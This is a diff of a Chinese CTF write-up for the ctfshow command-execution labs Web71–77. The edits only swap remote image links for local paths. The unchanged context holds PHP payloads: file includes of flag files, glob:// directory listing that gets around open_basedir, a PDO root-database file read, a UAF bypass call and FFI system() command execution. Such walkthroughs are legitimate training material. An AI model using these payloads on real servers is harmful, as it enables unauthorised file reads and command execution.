@@ -63,9 +63,9 @@ Web71
   
 没有源码了，警告了一堆啥，题目有下载源码，先看看源码  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwpH0aUFUSuMeBnw2yLdzv69wz65YhevqFF45VERR3TjZwg9jIeXRJd5mzAyQ4Q1tpLd4fM43lyrTalJiaLtTB9BoYAFRpgVsBM/640?wx_fmt=png "")  
+![](../../.resource/remote/ddeae215e8b4a9d8639a463cfe67be208d65e9738550eedc9b264a5108269f0c.png "")  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwSb2ibQQ0mnLtj1eqPjt5wNUia4MwgP7VIcNAL8VbRNu4Uwk60fKoUiaoylPtRf37Vt6YytB0uOF9qZkVAaSgG6870J3XMJ2JGIE/640?wx_fmt=png "")  
+![](../../.resource/remote/e70fca48ed7214c3e486676029d05f521f1fbdb72b9e1e24cd085055ff460377.png "")  
   
 可以发现，执行完eval函数后   
   
@@ -84,7 +84,7 @@ ob_end_clean(); echo preg_replace("/[0-9]|[a-z]/i","?",$s);
   
 c=include('/flag.txt');exit();  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzibuiclpagVtzxPD5JM22gAEJbNvRT0WkTauffeo47vBGqAnMocIqlN68v4e82CibHxA4pxKV8bjGe8ica2t9LOluKIVKRnY51LzA/640?wx_fmt=png "")  
+![](../../.resource/remote/7b8d732a3d0a3288b535318f0ca65d59cf2bc28e465e7d17e6cbe21a849d239f.png "")  
   
 Web72  
   
@@ -92,7 +92,7 @@ Web72
   
 发现open_basedir限制了读取，这里只允许访问 /var/www/html/ 目录。  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyGQj24JBmw78XHZ8rx4IAkSHtB1broJdoseB9biaJ1XEGIM2jU8pnqoib5kagSliaMYkibPZLZ8j1liaMU1hYvGmIjn0IJRmYM0mMk/640?wx_fmt=png "")  
+![](../../.resource/remote/756c00cb007db3fb89d7139c8782853f834403ead665e747a4680be1db3d9c3f.png "")  
   
 不太会，看来其他师傅的操作  
   
@@ -100,7 +100,7 @@ ctfshow web入门--命令执行_ctfshow web入门命令执行-CSDN博客
   
 可以利用glob伪协议，glob伪协议在筛选目录时不受open_basedir制约。  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwJtxicFwHx0VoDWawxpDib5Csgmu38kJ3GGVoOj9IXjgDaVGCttmpGIG0bPHeQpq2tLfgVGmQrwDulBhSibJiaIqTuy2MOJibOAV1k/640?wx_fmt=png "")  
+![](../../.resource/remote/8ad106c0f890beb854e2a968570650d31802aeebca9fc8992ed31b46364f1741.png "")  
   
 c=  
 𝑎  
@@ -134,7 +134,7 @@ c=$a=opendir("glob:///*");while(($file = readdir($a)) !== false){echo $file . "
   
 ";};exit();  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzSWVV6VJMT2oQlVC21IOydwSqFkY6iahmSw0VowNpkP6SQuojHO7Ny3JJj1uZMbtJtqpiag7DdTfQzHwjibFm6A9kAQGX7GVLq8g/640?wx_fmt=png "")  
+![](../../.resource/remote/88099cf2a88d32b85b62208bed24624d91088fdf3a0c40c9175d535641606ca8.png "")  
   
 可以知道了flag应该在flag0.txt里面，那么需要绕过安全限制可以用UAF漏洞利用代码  
   
@@ -869,7 +869,7 @@ ctfshow("cat /flag0.txt");ob_end_flush();
   
    
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwziaFL0vxCQhXv5IVQicWUgvctV9ibCIeZibeIpaq7pwTRBiaBak8ibMMOCy8y7bkUGxB10ngibFhPjJoDuNNRWVwrwOQy4hOZx0c0fU/640?wx_fmt=png "")  
+![](../../.resource/remote/6ebc1f3904a2272e2a77d869dd82834d09c4be72d6ea18d55137d4c1ab6bec60.png "")  
   
 Web72  
   
@@ -879,13 +879,13 @@ c=var_export(scandir('/'));exit();
   
 发现可以，并且存在flagc.txt文件  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEwVQkhaBibFHY99g0e8ojrNSjznNRauTXiaXjOfxZPfuQQtCy3xTInzUaHLb1KqvkUibcOrRgWF6tovFy8CdGxUSibqXBWdALcUONE/640?wx_fmt=png "")  
+![](../../.resource/remote/d53b384489b23e2dffc7102228470f1077061616e8af1dd615001025fa06fa3c.png "")  
   
 c=include('/flagc.txt');exit();  
   
    
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyKQRPRBKke7Th9icZaL6yCtnTdfQlzvTrgXd6VRLRJCIicJb7q46NAR0LJh5nDpkiaOlF1xicHTprmo1xrCSkS7RF96tpQXVZqCO0/640?wx_fmt=png "")  
+![](../../.resource/remote/ebce55505d73aa451fcdec47fd1cfcbb214d455b1ed66d4028202aa219f36bf5.png "")  
   
 Web74  
   
@@ -899,19 +899,19 @@ c=$a=opendir("glob:///*");while(($file = readdir($a)) !== false){echo $file . "
   
 发现flagx.txt  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwZOvHIzIwbODywj952dDZZdibLBZzUmt95CNcWmyC7hTZyv9D07gZxibg3OXzQIe6F1erGL7HXxIEQmGicMJicWyBzxOP1rIHlaGA/640?wx_fmt=png "")  
+![](../../.resource/remote/c08855df3fa0eb05c6663809bfe0ffd85a9cf4cd633f0894e7f00cf0e80df714.png "")  
   
 c=include('/flagx.txt');exit();得到flag  
     
 (注意：PHP 的安全限制是精准禁用单个高危函数，而非禁用所有文件操作，这题应该是scandir（目录遍历）被禁，include（文件引入）未被禁。)  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzCUNtyOibNDda9fQet1Iyc4CZJklTJXfuNlxibVBiaOoEyj32J4wcAqhjicGUiaWSKk1icLq5Sm9jZoXkV2ylfF2HNot729art0Ygqk/640?wx_fmt=png "")  
+![](../../.resource/remote/c1e3e7ea71150d3f3b5740b28191b9a4a1f234ebd47bfbb061d1bc79d7201b26.png "")  
   
 Web75  
   
 同样操作得到flag36.txt  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEyXel9XmEiaQjIVg9UknxfDH2MIg17A8rNgVic3xs9saf7wE09aEv5P0fVT3ibGd4kcRXF1gKVf5GWjDR52OtFaRicicuNBYoiaXxbn8/640?wx_fmt=png "")  
+![](../../.resource/remote/8242d149c10bc805101dea8c7f804980aa5ee15e13f2d5e688bdf6718c0aab96.png "")  
   
 Include读文件又有安全机制了，那么uaf还能用吗，发现不成了  
   
@@ -919,9 +919,9 @@ Include读文件又有安全机制了，那么uaf还能用吗，发现不成了
   
 是通过PDO连接数据库information_schema(默认数据库)  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyfslXUZjfnP7lc6QL9magib3v3Pdn9O9saUuG9wJmroBUVib5fOqhxHHVmhBXvaGvxibZqQliboMWtbBL5Ro40S9eZSBESaU2rQf8/640?wx_fmt=png "")  
+![](../../.resource/remote/935e1b32d1ee56be49ab1bc53cd143ffa10f185b6ed570ae7919339758080a9c.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEzKBCM5McDnRIib8QWKZt8EKpcLF2JTxUMOJFWZHNQSIkEcT64sTKv3lWcNAnurb5xUavV6xoESxQIUEF9W6Vuj8AVZicUOy1Ycc/640?wx_fmt=png "")  
+![](../../.resource/remote/8a12fc32db87f9df7465df8d84995e766d7c320417704b5aad0d2040cffc05bf.png "")  
   
 c=try {$dbh = new PDO('mysql:host=localhost;dbname=information_schema', 'root',  
   
@@ -933,19 +933,19 @@ c=try {$dbh = new PDO('mysql:host=localhost;dbname=information_schema', 'root',
   
    
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyJYVQibOZVia51sXX8mCWicxDgUckBXU2vH5n3DGHHQOZJWSo8BK4qGuZib2MrnlDIdzlM5mdRRkSghMcNFALPT3RB3tVSu4Pj450/640?wx_fmt=png "")  
+![](../../.resource/remote/308f58cfec2d41e1c8e3e43d9946f72b7dcea7f85d152a8d64450a86cf7ee046.png "")  
   
 Web76  
   
 与上一关一样  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEzNLqQ50enQfDVHictJFCb1rJ3NX7hgtE3cibKP2sUherREugQnhSpwYVrB1vyg7KtrWRmFY1ic1mriaEia3WINwXfdPETvtGh04ibm4/640?wx_fmt=png "")  
+![](../../.resource/remote/bb7ea4043b6fb7a2f8b3343a234173ba5bbc4d64cfc3aa30e7fd5cb410b0aa80.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEwicz4QyEzoJdVHn8PF58aSFgDQnt0fcKgxmibxaCWdSDhD8eBoib0ibWGvg1LrmLggxNMPIYcvCsb98aX0BfTP9YjOy8tterBUiaQc/640?wx_fmt=png "")  
+![](../../.resource/remote/5e18a801ae3acd7d06cd2e90e04cf8bcbee778069cbe29cdf776bca64dbcdf41.png "")  
   
 Web77  
   
-![](https://mmbiz.qpic.cn/mmbiz_png/DBT7MicbvsEyPBjFBFgA52tSRCXgUXDnL73bX6L695SzBZA2BosZQafm4o6EADQlG9HRC2XPtKvHzB3SglWyFE81nQdN3USMsnY6bWqe4q1o/640?wx_fmt=png "")  
+![](../../.resource/remote/80ca508793f4913a9c0e3039a0304c50acfd1a8e645e822af41fa2a28500818c.png "")  
   
 用上一关不行  
   
@@ -965,7 +965,7 @@ $ffi->system($a);
   
 exit();  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/DBT7MicbvsEw8cRibFNSn2icyMhggcQTe400DHBLic4zF2t2D4jdKB9TIjYfIOed5Jwy8k59ibMKANRWlb0A6toaAclcOYSFklVPfGGn3kibB1QPI/640?wx_fmt=png "")  
+![](../../.resource/remote/15519da070ef7d777cd4d136a7b6dca220299b6114d3e2d0c7ba978040126c74.png "")  
   
 
 
